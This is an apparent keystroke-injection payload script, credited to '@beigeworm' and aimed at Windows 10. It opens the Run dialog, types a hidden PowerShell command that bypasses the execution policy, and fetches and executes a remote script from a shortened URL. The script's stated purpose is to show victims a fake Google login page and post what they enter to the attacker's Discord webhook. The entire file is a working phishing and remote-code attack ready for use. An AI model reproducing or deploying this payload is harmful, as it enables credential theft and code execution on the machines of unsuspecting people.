// Title: beigeworm's Fake Google Phishing page to Discord Webhook.
// Author: @beigeworm
// Description: This script makes a Fake Google Phishing page and posts results to a discord webhook.
// Target: Windows 10
// *SETUP*
// replace DISCORD_WEBHOOK_HERE with your Discord Webhook.

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C $dc='DISCORD_WEBHOOK_HERE'; irm https://is.gd/bw_gp_to_dc | iex");
delay(500);
press("ENTER");
